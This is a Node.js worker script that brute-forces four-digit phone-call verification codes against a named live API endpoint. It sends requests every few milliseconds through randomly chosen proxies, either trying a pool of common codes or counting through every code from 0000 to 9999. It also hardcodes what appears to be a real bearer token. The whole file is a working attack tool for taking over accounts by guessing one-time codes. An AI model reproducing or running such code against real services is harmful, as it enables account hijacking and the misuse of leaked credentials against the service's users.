const axios = require('axios');
const async = require('async');
const { parentPort, workerData } = require('worker_threads');
const { PROXIES, CODE_POOL, BRUTE_TYPE } = require('../configs');
const padStart = require('lodash/padStart')

const instance = axios.create({
    baseURL: 'https://api.za.gorodsreda.ru/v1',
    timeout: 5000,
    headers: {
        "accept": "application/json, text/plain, *\/*",
        "accept-language": "ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,ru-RU;q=0.6,en-US;q=0.5,en;q=0.4",
        "authorization": "Bearer NJ4cWN7hLGujEjfbtkoKNjipjORTsrFE_1619614767",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }
});

if(PROXIES.length >= 1) {
    instance.defaults.proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
}

const { personUid } = workerData;

function clock(start) {
    if (!start) return process.hrtime();
    var end = process.hrtime(start);
    return Math.round((end[0]*1000) + (end[1]/1000000));
}

if(!personUid) return;

let count = 0;
let start = clock();

const brute = async () => {
    setInterval(async () => {
        count++
        let code = padStart(count, 4, '0');

        try {
            let response = await instance.post('/phone-auth/call-code', { personUid, code })

            let taken_time = clock(start);

            parentPort.postMessage({success: true, response: {
                    code: JSON.parse(response.config.data).code,
                    data: response.data,
                    time: taken_time / 1000
                }})
        } catch (e) {
            if (code % 500 === 0) console.log(`Iters: ${code}, response: ${JSON.stringify(err?.response?.data)}`)
        }

        if(count >= 10001) parentPort.postMessage({success: false, error: "Code expired."})
    }, 3)
}

const pool = async () => {
    await async.map(CODE_POOL, async item => {
        try {
            let code = padStart(item, 4, '0');
            let response = await instance.post('/phone-auth/call-code', { personUid, code })

            let taken_time = clock(start);

            parentPort.postMessage({success: true, response: {
                    code: JSON.parse(response.config.data).code,
                    data: response.data,
                    time: taken_time / 1000
                }})
        } catch (e) {
            parentPort.postMessage({success: false, error: "Not found!"})
        }
    })
}

if(BRUTE_TYPE === "POOL") {
    pool().then();
} else if(BRUTE_TYPE === "BRUTE") {
    brute().then();
} else if(BRUTE_TYPE === "COMBINED") {
    pool().then(brute)
}